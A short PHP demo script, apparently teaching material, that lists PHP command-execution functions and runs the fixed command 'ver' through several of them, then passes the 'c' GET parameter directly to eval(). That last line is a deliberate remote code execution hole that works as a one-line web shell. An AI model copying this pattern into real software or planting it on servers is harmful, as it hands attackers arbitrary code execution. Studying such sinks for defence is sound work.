<?php


//命令执行
//system()
//passthru()
//exec()
//shell_exec()
//popen()
//proc_open()
//pcntl_exec()


$cmd='ver';
system($cmd);
echo '<hr>';

echo shell_exec($cmd);
echo '<hr>';

echo exec($cmd);
echo '<hr>';

passthru($cmd);
echo '<hr>';


//代码执行
$code=$_GET['c'];

eval($code);
echo '<hr>';

//assert($code);
//echo '<hr>';


